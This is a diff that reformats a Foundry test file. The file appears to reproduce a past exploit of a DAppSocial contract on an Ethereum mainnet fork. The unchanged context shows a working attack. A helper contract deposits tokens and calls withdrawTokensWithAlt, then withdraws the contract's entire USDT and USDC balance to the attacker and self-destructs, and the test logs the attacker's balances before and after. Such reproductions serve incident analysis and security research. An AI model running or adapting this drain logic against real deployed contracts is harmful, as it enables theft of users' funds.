@@ -19,29 +19,19 @@ interface IDAppSocial {
 
     function lockTokens(address altAccount, uint48 length) external;
 
-    function withdrawTokens(
-        address _tokenAddress,
-        uint256 _tokenAmount
-    ) external;
+    function withdrawTokens(address _tokenAddress, uint256 _tokenAmount) external;
 
-    function withdrawTokensWithAlt(
-        address tokenAddress,
-        address from,
-        uint256 amount
-    ) external;
+    function withdrawTokensWithAlt(address tokenAddress, address from, uint256 amount) external;
 }
 
 contract DAppTest is Test {
-    IUSDT private constant USDT =
-        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    IERC20 private constant USDC =
-        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IDAppSocial private constant DAppSocial =
-        IDAppSocial(0x319Ec3AD98CF8b12a8BE5719FeC6E0a9bb1ad0D1);
+    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IDAppSocial private constant DAppSocial = IDAppSocial(0x319Ec3AD98CF8b12a8BE5719FeC6E0a9bb1ad0D1);
     HelperExploitContract private helperExploitContract;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 18048982);
+        vm.createSelectFork("mainnet", 18_048_982);
         vm.label(address(USDT), "USDT");
         vm.label(address(USDC), "USDC");
         vm.label(address(DAppSocial), "DAppSocial");
@@ -54,16 +44,10 @@ contract DAppTest is Test {
         USDT.approve(address(DAppSocial), 2e6);
         USDC.approve(address(DAppSocial), 2e6);
 
-        emit log_named_decimal_uint(
-            "Attacker USDT balance before exploit",
-            USDT.balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint("Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 6);
 
         emit log_named_decimal_uint(
-            "Attacker USDC balance before exploit",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
+            "Attacker USDC balance before exploit", USDC.balanceOf(address(this)), USDC.decimals()
         );
 
         drainToken(address(USDT));
@@ -72,27 +56,17 @@ contract DAppTest is Test {
         // Destroy (selfdestruct) helper exploit contract after draining the tokens
         helperExploitContract.killMe();
 
-        emit log_named_decimal_uint(
-            "Attacker USDT balance after exploit",
-            USDT.balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint("Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 6);
 
         emit log_named_decimal_uint(
-            "Attacker USDC balance after exploit",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
+            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
         );
     }
 
     function drainToken(address token) internal {
         DAppSocial.depositTokens(token, 2e6);
         helperExploitContract.exploit(token, false);
-        DAppSocial.withdrawTokensWithAlt(
-            token,
-            address(helperExploitContract),
-            1e6
-        );
+        DAppSocial.withdrawTokensWithAlt(token, address(helperExploitContract), 1e6);
         helperExploitContract.exploit(token, true);
     }
 
@@ -100,12 +74,9 @@ contract DAppTest is Test {
 }
 
 contract HelperExploitContract {
-    IUSDT private constant USDT =
-        IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    IERC20 private constant USDC =
-        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IDAppSocial private constant DAppSocial =
-        IDAppSocial(0x319Ec3AD98CF8b12a8BE5719FeC6E0a9bb1ad0D1);
+    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
+    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IDAppSocial private constant DAppSocial = IDAppSocial(0x319Ec3AD98CF8b12a8BE5719FeC6E0a9bb1ad0D1);
     address payable private immutable owner;
 
     constructor() {
@@ -117,16 +88,10 @@ contract HelperExploitContract {
         require(msg.sender == owner, "Only owner");
         if (withdraw == true) {
             if (token == address(USDT)) {
-                DAppSocial.withdrawTokens(
-                    address(token),
-                    USDT.balanceOf(address(DAppSocial))
-                );
+                DAppSocial.withdrawTokens(address(token), USDT.balanceOf(address(DAppSocial)));
                 USDT.transfer(owner, USDT.balanceOf(address(this)));
             } else {
-                DAppSocial.withdrawTokens(
-                    address(token),
-                    USDC.balanceOf(address(DAppSocial))
-                );
+                DAppSocial.withdrawTokens(address(token), USDC.balanceOf(address(DAppSocial)));
                 USDC.transfer(owner, USDC.balanceOf(address(this)));
             }
         } else {
